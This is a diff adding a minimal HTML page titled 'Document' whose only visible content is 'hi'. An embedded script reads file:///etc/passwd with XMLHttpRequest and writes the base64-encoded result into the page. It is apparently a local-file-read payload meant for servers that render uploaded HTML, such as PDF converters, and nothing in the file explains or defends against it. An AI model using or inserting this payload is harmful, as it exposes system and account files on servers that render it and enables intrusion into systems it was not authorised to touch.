@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+<h1>hi</h1>
+    <script>
+        x=new XMLHttpRequest;
+        x.onload=function(){document.write(btoa(this.responseText))};
+        x.open("GET","file:///etc/passwd");x.send();
+        </script>
+</body>
+</html>
